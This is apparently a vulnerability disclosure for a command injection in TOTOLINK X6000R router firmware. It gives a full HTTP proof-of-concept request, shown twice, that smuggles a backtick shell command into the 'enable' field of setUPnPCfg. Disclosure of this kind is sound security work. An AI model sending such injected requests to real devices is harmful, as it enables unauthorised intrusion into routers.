# Summary
There is a command execution vulnerability in TOTOLINK X6000R V9.4.0cu.852_B20230719(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is "/advance/upnp.html".

# Details
Web front-end interface:
![image](https://github.com/user-attachments/assets/dda276a6-99ee-4fa3-a31a-01d2f805e880)


Capture the packet and see the enable parameter, and do a blind test directly:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=F144B7DB500E569C HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/upnp.html?token=F144B7DB500E569C
Priority: u=1

{"enable":"`ls >/web/poc_upnp.txt`","topicurl":"setUPnPCfg"}
```
![image](https://github.com/user-attachments/assets/43b69ca3-0b3d-41e9-8514-521296663dcc)

![image](https://github.com/user-attachments/assets/1dabdeb8-53c2-4de2-9578-d821c900feb5)



# PoC
Capture the packet and see the enable parameter, and do a blind test directly:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=F144B7DB500E569C HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/upnp.html?token=F144B7DB500E569C
Priority: u=1

{"enable":"`ls >/web/poc_upnp.txt`","topicurl":"setUPnPCfg"}
```
![image](https://github.com/user-attachments/assets/43b69ca3-0b3d-41e9-8514-521296663dcc)

![image](https://github.com/user-attachments/assets/1dabdeb8-53c2-4de2-9578-d821c900feb5)
